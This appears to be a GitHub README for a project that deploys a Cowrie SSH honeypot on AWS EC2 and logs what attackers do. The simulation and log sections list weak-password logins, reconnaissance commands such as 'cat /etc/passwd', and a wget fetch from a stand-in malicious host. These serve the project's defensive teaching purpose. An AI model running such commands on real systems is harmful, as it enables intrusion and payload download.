# SSH Honeypot using Cowrie (AWS EC2)

## 📌 Overview

This project demonstrates deployment of an SSH honeypot using Cowrie on AWS EC2 to monitor and analyze attacker behavior in real-time.

## ⚙️ Setup

* AWS EC2 (Ubuntu)
* Cowrie Honeypot
* SSH Port: 2222
* Publicly exposed instance

## 🎯 Objectives

* Capture unauthorized login attempts
* Record attacker commands
* Analyze post-compromise behavior

## 🔍 Attack Simulation

An attacker connected to the honeypot using weak credentials:

* Username: root
* Passwords tried: 123456, password

After successful login, the attacker executed:

* `whoami`
* `uname -a`
* `ls`
* `pwd`
* `cat /etc/passwd`

Also simulated malicious behavior:

* `wget http://malicious.com/file.sh`

## 📊 Data Collected

* Attacker IP address
* Login attempts
* Command execution logs
* Session activity

## 📁 Project Structure

```
ssh-honeypot-cowrie/
├── logs/
├── screenshots/
├── analysis/
└── README.md
```

## 📸 Screenshots

Screenshots of attack sessions and logs are included in the `screenshots/` folder.

## 📸 Attack Simulation Screenshots

### 🔐 SSH Login Attempt
![SSH Login](screenshots/attack.png)

### 💻 Commands Executed by Attacker
![Commands](screenshots/commands.png)

### 📜 Honeypot Logs Captured
![Logs](screenshots/logs.png)
## 🧠 Findings

* Weak passwords are highly targeted
* Attackers perform system reconnaissance immediately after login
* Automated scripts attempt file downloads

## 🧾 Sample Captured Logs

```bash
CMD: whoami
CMD: uname -a
CMD: ls
CMD: pwd
CMD: cat /etc/passwd
CMD: wget http://malicious.com/file.sh

## 🧠 Key Observations

- Attackers attempt weak credentials like "root:123456"
- Immediate system reconnaissance after login
- Automated scripts try to download malicious files
- Honeypot successfully captures full session activity

## 🚀 Conclusion

The Cowrie honeypot successfully captured attacker behavior and demonstrated how honeypots can be used for threat intelligence and monitoring.

## 🛠️ Tools Used

* Cowrie
* AWS EC2
* SSH
* Linux
